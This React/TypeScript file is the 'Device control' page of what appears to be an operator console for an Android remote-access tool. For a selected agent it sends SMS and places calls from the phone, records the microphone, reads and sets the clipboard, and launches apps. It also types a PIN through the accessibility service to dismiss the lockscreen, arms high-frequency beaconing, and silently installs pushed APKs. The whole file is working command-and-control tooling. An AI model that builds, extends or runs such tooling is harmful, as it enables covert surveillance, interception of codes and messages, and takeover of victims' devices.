import { useState } from "react";
import { toast } from "sonner";
import {
  Clipboard as ClipIcon, MessageSquareText, Mic, Package, PhoneCall, RefreshCw, Flashlight, Vibrate, Volume2,
} from "lucide-react";
import { postOp } from "@/lib/api";
import { fmtBytes } from "@/lib/format";
import { useConsole } from "@/state";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Slider } from "@/components/ui/slider";
import { Switch } from "@/components/ui/switch";
import { Separator } from "@/components/ui/separator";
import { Textarea } from "@/components/ui/textarea";
import {
  AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription,
  AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const NO_SESSION = (
  <div className="text-center py-14 text-muted-foreground">
    <p className="text-sm">No session selected.</p>
    <p className="text-xs font-mono mt-1 opacity-70">pick an agent from the strip above</p>
  </div>
);

function CardWrap({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <Card>
      <CardHeader className="pb-2"><CardTitle className="font-mono text-[11px] uppercase tracking-widest text-muted-foreground">{title}</CardTitle></CardHeader>
      <CardContent className="space-y-2.5">{children}</CardContent>
    </Card>
  );
}

export default function ControlView() {
  const { snapshot, activeSession } = useConsole();
  const s = activeSession();
  const hasActive = !!snapshot?.active;

  const [smsNum, setSmsNum] = useState("");
  const [smsText, setSmsText] = useState("");
  const [callNum, setCallNum] = useState("");
  const [recSecs, setRecSecs] = useState(10);
  const [recOut, setRecOut] = useState<{ wav: string; bytes: number; path: string } | null>(null);
  const [recBusy, setRecBusy] = useState(false);
  const [pin, setPin] = useState("");
  const [pinOpen, setPinOpen] = useState(false);
  const [volLevel, setVolLevel] = useState(7);
  const [volOut, setVolOut] = useState("");
  const [torchOn, setTorchOn] = useState(false);
  const [clipText, setClipText] = useState("");
  const [clipOut, setClipOut] = useState("");
  const [pkg, setPkg] = useState("");
  const [fastpoll, setFastpoll] = useState(120);
  const [apk, setApk] = useState<File | null>(null);
  const [updateOut, setUpdateOut] = useState("");
  const [apkOpen, setApkOpen] = useState(false);

  if (!hasActive) return NO_SESSION;

  const run = async (op: string, args: Record<string, unknown> = {}, label = op): Promise<{ text?: string; ok?: boolean } | null> => {
    try {
      const r = await postOp<{ text?: string; ok?: boolean; error?: string }>(op, args);
      if (r.error) toast.error(r.error);
      else toast.success(`${label} — ${(r.text || "done").replace(/^OK /, "")}`);
      return r;
    } catch (e) { toast.error(String(e instanceof Error ? e.message : e)); return null; }
  };

  const b64OfFile = async (f: File) => {
    const buf = new Uint8Array(await f.arrayBuffer());
    let bin = "";
    for (let i = 0; i < buf.length; i += 8192) bin += String.fromCharCode(...buf.subarray(i, i + 8192));
    return btoa(bin);
  };

  return (
    <div className="max-w-[1400px] space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="font-mono text-sm uppercase tracking-widest font-semibold">Device control</h2>
          <p className="text-xs text-muted-foreground font-mono mt-0.5">acting on {s!.tag} · {s!.model}</p>
        </div>
        <Badge variant={s!.status === "online" ? "default" : "secondary"} className="font-mono text-[10px]">{s!.status}</Badge>
      </div>

      <div className="grid md:grid-cols-2 xl:grid-cols-3 gap-4">
        <CardWrap title="Messaging">
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Number</Label>
          <Input value={smsNum} onChange={(e) => setSmsNum(e.target.value)} placeholder="+15551234567" className="font-mono text-xs" />
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Message</Label>
          <Textarea value={smsText} onChange={(e) => setSmsText(e.target.value)} rows={2} placeholder="text to send from the device" className="font-mono text-xs" />
          <Button className="w-full" size="sm" disabled={!smsNum || !smsText}
            onClick={() => run("sms", { number: smsNum, text: smsText }, "SMS sent")}>
            <MessageSquareText className="size-3.5 mr-1" /> Send SMS
          </Button>
          <Separator />
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Voice call</Label>
          <div className="flex gap-2">
            <Input value={callNum} onChange={(e) => setCallNum(e.target.value)} placeholder="+15551234567" className="font-mono text-xs" />
            <Button variant="secondary" size="sm" className="shrink-0" disabled={!callNum}
              onClick={() => run("call", { number: callNum }, "call placed")}>
              <PhoneCall className="size-3.5" /> Call
            </Button>
          </div>
        </CardWrap>

        <CardWrap title="Microphone">
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Duration (seconds)</Label>
          <div className="flex gap-2">
            <Input type="number" min={1} max={120} value={recSecs} onChange={(e) => setRecSecs(Number(e.target.value) || 10)} className="font-mono text-xs w-24" />
            <Button size="sm" className="flex-1" disabled={recBusy}
              onClick={async () => {
                setRecBusy(true); setRecOut(null);
                try {
                  const r = await postOp<{ wav?: string; bytes?: number; path?: string; error?: string }>("rec", { secs: recSecs });
                  if (r.error) toast.error(r.error);
                  else if (r.wav) { setRecOut({ wav: r.wav, bytes: r.bytes!, path: r.path! }); toast.success("recording captured"); }
                } catch (e) { toast.error(String(e instanceof Error ? e.message : e)); }
                setRecBusy(false);
              }}>
              <Mic className="size-3.5 mr-1" /> {recBusy ? "Recording…" : "Record"}
            </Button>
          </div>
          {recOut && (
            <div className="space-y-1">
              <audio controls src={`data:audio/wav;base64,${recOut.wav}`} className="w-full h-9" />
              <p className="text-[10px] font-mono text-muted-foreground">{fmtBytes(recOut.bytes)} · {recOut.path}</p>
            </div>
          )}
        </CardWrap>

        <CardWrap title="Locks">
          <div className="grid grid-cols-2 gap-2">
            <Button variant="outline" size="sm" onClick={() => run("wake", { secs: 60 }, "screen woken")}>☀ Wake 60s</Button>
            <Button variant="outline" size="sm" onClick={() => run("sleep", {}, "screen locked")}>☾ Lock screen</Button>
          </div>
          <Separator />
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Dismiss PIN keyguard</Label>
          <div className="flex gap-2">
            <Input type="password" value={pin} onChange={(e) => setPin(e.target.value)} placeholder="PIN" autoComplete="off" className="font-mono text-xs" />
            <Button variant="destructive" size="sm" className="shrink-0" disabled={!pin} onClick={() => setPinOpen(true)}>Unlock</Button>
          </div>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            Needs the accessibility service. Best-effort — OEM lockscreens vary.
          </p>
        </CardWrap>

        <CardWrap title="Hardware">
          <div className="flex items-center gap-3 flex-wrap">
            <label className="flex items-center gap-2 text-xs font-mono text-muted-foreground cursor-pointer">
              <Flashlight className="size-3.5" /> Torch
              <Switch checked={torchOn} onCheckedChange={(v) => {
                setTorchOn(v);
                run("torch", { state: v ? "on" : "off" }, "torch " + (v ? "on" : "off"));
              }} />
            </label>
            <Button variant="outline" size="sm" onClick={() => run("vibrate", { ms: 500 }, "vibrated")}><Vibrate className="size-3.5 mr-1" /> Vibrate 500ms</Button>
          </div>
          <Separator />
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Volume</Label>
          <div className="grid grid-cols-4 gap-2">
            <Button variant="outline" size="sm" onClick={() => run("vol", { level: "up" }, "vol +")}><Volume2 className="size-3.5 mr-1" />+</Button>
            <Button variant="outline" size="sm" onClick={() => run("vol", { level: "down" }, "vol −")}>−</Button>
            <Button variant="outline" size="sm" onClick={() => run("vol", { level: "mute" }, "muted")}>Mute</Button>
            <Button variant="outline" size="sm" onClick={async () => {
              const r = await run("vol", {}, "volume read");
              if (r?.text) {
                setVolOut(r.text);
                const m = r.text.match(/volume=(\d+)/);
                if (m) setVolLevel(Number(m[1]));
              }
            }}>Read</Button>
          </div>
          <div className="flex items-center gap-3">
            <Slider value={[volLevel]} min={0} max={15} step={1} onValueChange={(v) => setVolLevel(v[0])} className="flex-1" />
            <span className="font-mono text-xs w-8 text-right tabular-nums">{volLevel}</span>
            <Button variant="outline" size="sm" className="shrink-0"
              onClick={() => run("vol", { level: String(volLevel) }, "volume set")}>Set</Button>
          </div>
          {volOut && <p className="text-[11px] font-mono text-emerald-500">{volOut}</p>}
        </CardWrap>

        <CardWrap title="Clipboard">
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Push text to device</Label>
          <Textarea value={clipText} onChange={(e) => setClipText(e.target.value)} rows={2} placeholder="text to place on the device clipboard" className="font-mono text-xs" />
          <Button size="sm" className="w-full" disabled={!clipText} onClick={() => run("clipset", { text: clipText }, "clipboard set")}>
            <ClipIcon className="size-3.5 mr-1" /> Set clipboard
          </Button>
          <Separator />
          <Button variant="outline" size="sm" className="w-full"
            onClick={async () => { const r = await run("clipget", {}, "clipboard read"); setClipOut(r?.text || "(empty)"); }}>
            Read device clipboard
          </Button>
          {clipOut && <p className="text-[11px] font-mono text-emerald-500 break-all">{clipOut}</p>}
        </CardWrap>

        <CardWrap title="Apps & polling">
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Launch application</Label>
          <div className="flex gap-2">
            <Input value={pkg} onChange={(e) => setPkg(e.target.value)} placeholder="com.android.chrome" className="font-mono text-xs" />
            <Button size="sm" className="shrink-0" disabled={!pkg} onClick={() => run("startapp", { pkg }, `launched ${pkg}`)}>
              <Package className="size-3.5" /> Launch
            </Button>
          </div>
          <Separator />
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Fast polling</Label>
          <div className="flex gap-2 items-center">
            <Select value={String(fastpoll)} onValueChange={(v) => setFastpoll(Number(v))}>
              <SelectTrigger size="sm" className="w-28 font-mono text-xs"><SelectValue /></SelectTrigger>
              <SelectContent>
                <SelectItem value="30">30s</SelectItem>
                <SelectItem value="120">2m</SelectItem>
                <SelectItem value="600">10m</SelectItem>
                <SelectItem value="3600">1h</SelectItem>
              </SelectContent>
            </Select>
            <Button size="sm" className="flex-1" onClick={() => run("fastpoll", { secs: fastpoll }, `fastpoll ${fastpoll}s armed`)}>
              Arm fastpoll
            </Button>
          </div>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            High-frequency beaconing (~0.7s) for the window — speeds up every remote action.
          </p>
        </CardWrap>

        <CardWrap title="Agent update">
          <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">APK to push &amp; install silently (≤ 32 MB)</Label>
          <Input type="file" accept=".apk" onChange={(e) => setApk(e.target.files?.[0] ?? null)} className="font-mono text-xs file:mr-3" />
          <Button variant="secondary" size="sm" className="w-full" disabled={!apk} onClick={() => setApkOpen(true)}>
            Upload &amp; install
          </Button>
          <Separator />
          <Button variant="outline" size="sm" className="w-full"
            onClick={async () => { const r = await run("installstatus", {}, "install status"); setUpdateOut(r?.text || "(no response)"); }}>
            <RefreshCw className="size-3.5 mr-1" /> Check install status
          </Button>
          {updateOut && <p className="text-[11px] font-mono text-emerald-500">{updateOut}</p>}
        </CardWrap>
      </div>

      {/* PIN confirm */}
      <AlertDialog open={pinOpen} onOpenChange={setPinOpen}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Wake and dismiss keyguard with PIN?</AlertDialogTitle>
            <AlertDialogDescription>
              The PIN will be typed on {s!.tag} via the accessibility service. OEM lockscreen implementations vary.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction onClick={async () => { setPinOpen(false); await run("unlock", { pin }, "unlock attempted"); setPin(""); }}>
              Unlock
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* APK confirm */}
      <AlertDialog open={apkOpen} onOpenChange={setApkOpen}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Push and silently install APK?</AlertDialogTitle>
            <AlertDialogDescription>
              {apk?.name} ({apk ? fmtBytes(apk.size) : ""}) will be uploaded to {s!.tag} and installed. The device re-beacons after the update.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction onClick={async () => {
              setApkOpen(false);
              if (!apk) return;
              toast("uploading " + apk.name + "…");
              try {
                const r = await postOp<{ uploaded?: number; text?: string; error?: string }>("update", { data_b64: await b64OfFile(apk) });
                setUpdateOut(`uploaded ${fmtBytes(r.uploaded || 0)}\n${r.text || r.error || ""}`);
                toast[r.error ? "error" : "success"](r.error ? r.error : "install triggered — check status");
              } catch (e) { toast.error(String(e instanceof Error ? e.message : e)); }
            }}>
              Install
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}
